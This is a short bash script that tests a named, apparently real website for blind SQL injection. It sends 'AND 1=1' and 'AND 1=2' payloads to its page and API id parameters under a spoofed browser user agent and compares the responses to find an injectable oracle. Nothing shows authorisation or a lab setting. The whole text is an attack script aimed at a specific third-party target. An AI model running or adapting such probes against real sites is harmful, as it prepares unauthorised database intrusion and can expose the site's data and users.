#!/bin/bash
# Differential oracle test: is the body stable & does it differ between AND 1=1 / AND 1=2 ?
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
B="https://www.infinitycapital.bh"
probe () {
  local name="$1"; local url="$2"
  for i in 1 2 3; do
    for v in "1" "1 AND 1=1" "1 AND 1=2"; do
      r=$(curl -sk -o /tmp/d.body -w "%{http_code}|%{size_download}" -A "$UA" "$url$v")
      echo "$name rep$i v=[$v] -> $r md5=$(md5sum /tmp/d.body|cut -c1-16) title=$(grep -o '<title>[^<]*' /tmp/d.body|head -1)"
      sleep 1
    done
  done
}
probe "ROOT_page" "$B/?page="
probe "API_id" "$B/api/?id="
